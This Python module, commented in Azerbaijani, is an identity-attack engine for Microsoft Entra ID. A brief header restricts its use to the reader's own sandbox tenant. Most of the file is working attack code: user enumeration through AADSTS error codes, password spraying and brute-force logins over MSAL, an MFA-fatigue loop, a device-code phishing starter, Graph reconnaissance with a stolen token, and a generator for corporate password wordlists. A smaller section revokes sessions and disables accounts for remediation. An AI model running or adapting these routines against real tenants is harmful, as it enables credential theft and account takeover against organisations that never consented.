"""
modules/attack_engine.py
-------------------------
DİQQƏT (VACİB): Bu modul YALNIZ sizin ÖZ test/sandbox Microsoft Entra ID
kirayəçinizə (tenant) qarşı, açıq razılıqla istifadə edilməlidir.
Başqa təşkilatın kirayəçisinə qarşı istifadəsi qanunsuzdur və
Microsoft-un İstifadə Şərtlərini pozur.

DƏYİŞİKLİKLƏR (əvvəlki versiya ilə müqayisədə):
 1. TENANT_ID / CLIENT_ID / CLIENT_SECRET və real istifadəçi şifrələri artıq
    mənbə kodunda YOXDUR — hamısı `.env` və `data/test_identities.json`
    fayllarından oxunur (bax: config.py, .env.example).
 2. `IdentityAttackEngine.__init__` credential-lar yoxdursa aydın xəta verir
    (əvvəlki versiyada bu, `app.py`-da idarə olunmayan crash-ə səbəb olurdu).
 3. Real Blue-Team remediation üçün iki yeni metod əlavə olunub:
    `revoke_sign_in_sessions()` və `disable_account()` — Microsoft Graph
    app-only (client credentials) axını ilə HƏQİQİ əməliyyat aparır.
"""
import os
import json
import time
import msal
import requests

from . import config

USERS_FILE = "users_wordlist.txt"
PASSWORDS_FILE = "passwords_wordlist.txt"

_DATA_DIR = os.path.join(os.path.dirname(__file__), "..", "data")
TEST_IDENTITIES_FILE = os.path.join(_DATA_DIR, "test_identities.json")


def _load_test_identities() -> dict:
    """
    Test istifadəçi/şifrə cütlüklərini xarici JSON fayldan oxuyur.
    Fayl mövcud deyilsə, nümunə şablon yaradır (REAL şifrə YAZMIR) və
    bunu `.gitignore`-a əlavə etməyi xatırladır.
    """
    if not os.path.exists(TEST_IDENTITIES_FILE):
        os.makedirs(_DATA_DIR, exist_ok=True)
        sample = {
            "_warning": "Bu fayl real test istifadəçi məlumatlarınızı saxlayır. "
                        "Mütləq .gitignore-a əlavə edin, ictimai repoya push etməyin!",
            "domain": config.DOMAIN or "example.onmicrosoft.com",
            "credentials": {
                "victimuser@example.onmicrosoft.com": "REPLACE_ME_ChangeThisPassword!"
            }
        }
        with open(TEST_IDENTITIES_FILE, "w", encoding="utf-8") as f:
            json.dump(sample, f, indent=2, ensure_ascii=False)
        return sample

    with open(TEST_IDENTITIES_FILE, "r", encoding="utf-8") as f:
        return json.load(f)


_identities = _load_test_identities()
DOMAIN = config.DOMAIN or _identities.get("domain", "example.onmicrosoft.com")
REAL_CREDENTIALS = dict(_identities.get("credentials", {}))


def generate_wordlists():
    if not os.path.exists(USERS_FILE):
        real_users = list(REAL_CREDENTIALS.keys())
        fake_users = [f"fake_user_{i}@{DOMAIN}" for i in range(1, 100)] + \
                     [f"corp_admin_{i}@{DOMAIN}" for i in range(1, 50)]
        all_users = real_users + fake_users
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            for u in all_users:
                f.write(f"{u}\n")

    if not os.path.exists(PASSWORDS_FILE):
        real_passwords = list(REAL_CREDENTIALS.values())
        common_passwords = [
            "Password123!", "Admin2026!", "Welcome123!", "Spring2026!",
            "P@ssw0rd123", "Corporate2026!", "ChangeMe123!", "Company123!"
        ]
        all_passwords = common_passwords + real_passwords
        with open(PASSWORDS_FILE, "w", encoding="utf-8") as f:
            for p in all_passwords:
                f.write(f"{p}\n")


def load_list_from_file(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]


class IdentityAttackEngine:
    """
    Red Team simulyasiya mühərriki (offensive) + Blue Team remediation (defensive).
    """

    def __init__(self, users_file, passwords_file):
        if not config.has_graph_credentials():
            raise RuntimeError(
                "ARGUS_TENANT_ID / ARGUS_CLIENT_ID / ARGUS_CLIENT_SECRET tapılmadı. "
                ".env faylını doldurun (bax: .env.example)."
            )
        self.public_app = msal.PublicClientApplication(
            config.CLIENT_ID, authority=config.AUTHORITY
        )
        self.users = load_list_from_file(users_file)
        self.passwords = load_list_from_file(passwords_file)

    # ------------------------------------------------------------------
    # RED TEAM — Hücum simulyasiyaları (əvvəlki məntiq eynilə saxlanılıb)
    # ------------------------------------------------------------------
    def run_user_enumeration(self, max_targets=20):
        print(f"\n[*] --- USER ENUMERATION TESTİ (İlk {max_targets} Hədəf) ---")
        for user in self.users[:max_targets]:
            result = self.public_app.acquire_token_by_username_password(
                username=user,
                password="DummyPassword123!",
                scopes=["https://graph.microsoft.com/.default"]
            )
            err_desc = result.get("error_description", "")
            if any(c in err_desc for c in ["AADSTS50126", "AADSTS50055", "AADSTS50053", "AADSTS7000218"]):
                print(f"[+] MÖVCUDDUR (Valid User): {user}")
            elif "AADSTS50034" in err_desc:
                print(f"[-] MÖVCUD DEYİL (Invalid User): {user}")
            else:
                print(f"[?] CAVAB ({user}): {err_desc[:50]}")

    def run_password_spray(self, spray_password="Autumn2026!Argus", max_targets=20):
        print(f"\n[*] --- KÜTLƏVİ PASSWORD SPRAY TESTİ ('{spray_password}') ---")
        targets = self.users[:max_targets]
        success_count = 0
        fail_count = 0
        for user in targets:
            result = self.public_app.acquire_token_by_username_password(
                username=user, password=spray_password,
                scopes=["https://graph.microsoft.com/.default"]
            )
            if "access_token" in result:
                print(f"[+] UĞURLU: {user}")
                success_count += 1
            else:
                err = result.get("error_description", "").splitlines()[0]
                print(f"[-] UĞURSUZ: {user} -> ({err[:55]}...)")
                fail_count += 1
        print(f"\n[=] XÜLASƏ: {success_count} Uğurlu | {fail_count} Uğursuz")

    def run_brute_force(self, target_user, target_password):
        print(f"\n[*] --- BRUTE FORCE TESTİ ({target_user}) ---")
        test_passwords = self.passwords[:5] + [target_password]
        for password in test_passwords:
            result = self.public_app.acquire_token_by_username_password(
                username=target_user, password=password,
                scopes=["https://graph.microsoft.com/.default"]
            )
            if "access_token" in result:
                print(f"[+] UĞURLU: Doğru şifrə tapıldı -> '{password}'")
                return result["access_token"]
            else:
                err = result.get("error_description", "").splitlines()[0]
                print(f"[-] UĞURSUZ: {password} -> ({err[:45]}...)")
            time.sleep(1)
        return None

    def run_mfa_fatigue_simulation(self, target_user, valid_password, count=2):
        print(f"\n[*] --- MFA FATIGUE SIMULYASİYASI ({target_user}) ---")
        for i in range(1, count + 1):
            print(f"[*] Cəhd #{i}...")
            result = self.public_app.acquire_token_by_username_password(
                username=target_user, password=valid_password,
                scopes=["https://graph.microsoft.com/.default"]
            )
            err_desc = result.get("error_description", "")
            if "access_token" in result:
                print("    [+] UĞURLU: Daxil olundu.")
            else:
                first_line = err_desc.splitlines()[0] if err_desc else "Xəta"
                print(f"    [-] Cavab: {first_line[:60]}...")
            time.sleep(2)

    def run_device_code_phishing_init(self):
        print("\n[*] --- OAUTH DEVICE CODE FLOW SIMULYASİYASI ---")
        flow = self.public_app.initiate_device_flow(scopes=["https://graph.microsoft.com/.default"])
        if "user_code" in flow:
            print(f"[+] Link: {flow['verification_uri']} | Kod: {flow['user_code']}")

    def run_post_exploitation_audit(self, access_token):
        print("\n[*] --- TOKEN ACCESS & GRAPH RECONNAISSANCE ---")
        if not access_token:
            return
        headers = {"Authorization": f"Bearer {access_token}"}
        response = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers)
        if response.status_code == 200:
            user_data = response.json()
            print(f"[+] Məlumat Əldə Edildi: {user_data.get('displayName')} ({user_data.get('userPrincipalName')})")

    # ------------------------------------------------------------------
    # BLUE TEAM — YENİ: Real remediation (Microsoft Graph app-only)
    # ------------------------------------------------------------------
    def get_admin_graph_token(self):
        """
        App-only (client credentials) token əldə edir. Bunun işləməsi üçün
        Entra ID App Registration-da 'User.ReadWrite.All' (Application icazəsi)
        admin tərəfindən təsdiqlənməlidir (admin consent).
        """
        cca = msal.ConfidentialClientApplication(
            config.CLIENT_ID,
            authority=config.AUTHORITY,
            client_credential=config.CLIENT_SECRET,
        )
        result = cca.acquire_token_for_client(scopes=["https://graph.microsoft.com/.default"])
        return result.get("access_token")

    def revoke_sign_in_sessions(self, user_upn: str):
        """Real: istifadəçinin bütün aktiv sessiya/refresh token-larını ləğv edir."""
        try:
            token = self.get_admin_graph_token()
        except Exception as e:
            return False, f"Admin token xətası: {e}"
        if not token:
            return False, "Admin token əldə edilmədi (Graph app-only icazələrini yoxlayın)."

        headers = {"Authorization": f"Bearer {token}"}
        resp = requests.post(
            f"https://graph.microsoft.com/v1.0/users/{user_upn}/revokeSignInSessions",
            headers=headers,
        )
        if resp.status_code in (200, 204):
            return True, "Sessiyalar ləğv edildi (revokeSignInSessions)."
        return False, f"HTTP {resp.status_code}: {resp.text[:200]}"

    def disable_account(self, user_upn: str):
        """Real: istifadəçi hesabını Entra ID-də deaktiv edir (accountEnabled=false)."""
        try:
            token = self.get_admin_graph_token()
        except Exception as e:
            return False, f"Admin token xətası: {e}"
        if not token:
            return False, "Admin token əldə edilmədi (Graph app-only icazələrini yoxlayın)."

        headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
        resp = requests.patch(
            f"https://graph.microsoft.com/v1.0/users/{user_upn}",
            headers=headers,
            json={"accountEnabled": False},
        )
        if resp.status_code in (200, 204):
            return True, "Hesab deaktiv edildi (accountEnabled=false)."
        return False, f"HTTP {resp.status_code}: {resp.text[:200]}"


if __name__ == "__main__":
    # Yalnız birbaşa `python modules/attack_engine.py` ilə işə salındıqda test axını.
    generate_wordlists()
    engine = IdentityAttackEngine(USERS_FILE, PASSWORDS_FILE)

    engine.run_user_enumeration(max_targets=18)
    engine.run_password_spray(spray_password="Autumn2026!Argus", max_targets=18)

    target = f"user2@{DOMAIN}"
    token = engine.run_brute_force(target_user=target, target_password="Company123!Secure")

    engine.run_mfa_fatigue_simulation(target_user=f"victimuser@{DOMAIN}", valid_password="ArgusPass#2026!", count=2)
    engine.run_device_code_phishing_init()

    if token:
        engine.run_post_exploitation_audit(token)